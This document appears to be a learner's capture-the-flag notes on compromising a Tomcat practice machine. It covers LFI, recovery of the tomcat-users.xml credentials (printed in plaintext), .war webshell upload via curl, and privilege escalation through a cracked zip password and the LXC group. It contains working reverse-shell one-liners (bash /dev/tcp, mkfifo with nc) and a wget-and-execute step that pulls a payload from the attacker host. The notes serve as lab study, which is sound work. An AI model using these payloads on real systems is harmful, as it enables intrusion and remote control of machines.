- [x] LFI
- [ ] ~~Maybe I can access data through this path somehow `/var/lib/tomcat9/webapps/ROOT/index.html`~~
- [x] Scower the RUNNING.txt file for something.
- [ ] Maybe I can access data through this path somehow `/var/lib/tomcat9/webapps/ROOT/index.html`
- [x] Try default credentials for `/html/manager`.
- [ ] Bruteforce the `/html/manager` login credentials.  
- [ ] Improper Authentication (Doesn't seem to have an available exploit) -- The version seems to be vulnerable.
- [x] Deserialization of untrusted data (the persistence manager thing). To replace the cookie with a path
- [x] Log Poisoning
- [x] Try default credentials for `/html/manager` and `/html/host-manager`.
- [ ] Bruteforce the `/html/manager` login credentials.

## <span style="color:#FF5050">What Do We Have? ü§îü§î 

* A `http://10.10.10.194:8080/manager/html` manager page that prompts me for a username and a password (Tried the defaults and they didn't work).
* Default credentials that could be the ones  
```
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```  

* My theory so far is that I find the credentials of the tomcat manager somehow (because it's not BRUTEFORCE) with the lfi then I can use the war exploit.
* I looked everywhere for a Tomcat exploit that could work but there isn't anything for the specific version and the specific circumstances. I found the Persistence Manager but that doesn't work. I found another couple of ones but the version I have doesn't seem to be vulnerable to them. So what now?
* I looked into apache exploits too but I didn't find anything there.
* Now I'm thinking maybe the fact that the website is a hosting service maybe this could mean something but I researched Tomcat and hosting and nothing came out of that.
* The LFI doesn't seem to give me anything. I found out that I could view the page's `news.php`'s code but also what the hell is the point of this? The code doesn't contain anything that I could exploit to go further in attacking the system.  
* After looking at the writeup's first part it turned out that I had to look for the right path of `tomcat-users.xml` it's not that I don't have authorization to read it, no, it seems that I was providing the wrong path.
* The `tomcat-users.xml`'s path turned out to be `/usr/share/tomcat9/etc/tomcat-users.xml` after thoroughly looking and googling and trying paths that did not work.
* Why should I have persued this file specifically because I clearly needed to get authenticated and the unauthorized page showed me that the creds can be found in this file.
* The creds `<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>`

```
fcrackzip -b -v -u ash_backup.zip -bvu 
``` 


FOUND ASH's password `admin@it` he used the same password for the zipped file that he used for his user on the os.
/snap/bin/lxc image import ./alpine.tar.gz --alias myimage

## <span style="color:#FF5050">Random NotesüëÄ
  
* PHP is being used in the backend.  
* So LFI gives me access to files, let's call it, outside of the sandboxed environment but it does not allow me to read files I don't have privilege to read. So what am I supposed to do with it?
* The `/files` directory returns code `403` and because of that if I was able to upload a file in the tomcat maybe I'll be able to execute it through this directory if the file was uploaded in here.
* The `http-proxy-open` thing on nmap is a bit weird maybe I should look more into it.
<br/><br/>
* I will use the manual exploit to try and understand it as much as I can (The upload war thing).
* It seems that I can't upload a .war file unless I have the right privileges which can be acquired if I have the roles admin, manager or manager-script and according to the `tomcat-users.xml` file I have the `manager-script` role.  
* The path was right infront of me in the HackTricks page in the RCE section. What lesson did I learn? Read articles properly and don't skip stuff.
* I will be creating a .war webshell and then I will upload it with this line of code  
  ```
  curl --upload-file webshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/webshell"
  ```  
* After creating the war file and uploading it using the previous curl code I can just visit the path `/webshell` with `?cmd=[COMMAND]` which will lead to executing the webshell.  
* Imma try and upload a reverse shell from the beginning and not a webshell  
  ```java
  Runtime r = Runtime.getRuntime();
  Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.10.14.8/1234;cat <&5 | while read line; do $line 2>&5 >&5; done'");
  p.waitFor();
  ```

  ```
  rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f
  ```
  ```
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

## <span style="color:#FF5050">How Did I Own This Shit üòéü•≥  

1. At first I looked through the web service and the tomcat service more than enough time which was not really necessary because I just had to find the right path to get to `tomcat-users.xml` I just was using the wrong paths. But the problem is how can I tell when I have an LFI and a file didn't show that I've been using the wrong path and not that I don't have permission to use it because, technically, the LFI is on the web service which means the `www-data` user and the file I'm trying to read is on the tomcat service which has another user `tomcat`? This thing has been nagging me all the time. How can I tell???  
2. Any how after you open the `tomcat-users.xml` file there's not much left to own the machine just that I get a password we can then authenticate as `host-manager` and then we can use the infamous .war exploit.
3. I used `msfvenom`'s java reverse shell (The only one that worked).
4. Then I got access as tomcat on the system.
5. Found out that the `/files` directory in the web service is owned by `ash` which was a bit weird and was kind of a hint that told me that maybe this directory will give me ash and it certainly did. There was a zipped file inside of it, I transferred this file to my box and tried to crack it using `fcrackzip` at first I tried the bruteforce mode but it didn't work and it didn't make any sense either os I tried dictionary mode with rockyou and it worked I cracked the password of the zipped file because it was password protected.
6. Anyway the contents of the zipped backup file weren't as important as the password because poor ash used the same password for their user on the OS which gave me access to him.
7. He was in group LXC so it wasn't that hard to get root afterwards. The priv esc of this type is all over the internet but I wanted to understand it fully why is it that when I create a container with alpine with this group that I can access the root? I still don't get that I want to research this more.

## <span style="color:#FF5050">Writeups ‚úçüèΩüìì   

### The Official HTB Writeup  

* When the reverse shell didn't work this is what they did which is actually a good idea
    <blockquote>
    Getting a reverse shell using the above command didn't work. Let's create a reverse shell, start an
    HTTP server locally and download it to the remote machine
    </blockquote>

    * Like this code --> `echo "0<&196;exec 196<>/dev/tcp/10.10.14.3/5555; sh <&196 >&196 2>&196" > shell
php -S 0.0.0.0:8000`.    

  * Then from the webshell I enter the following   
    ```
    wget http://10.10.14.3:8000/shell-x64.elf -O /tmp/shell
    chmod +x /tmp/shell
    bash /tmp/shell
    ```
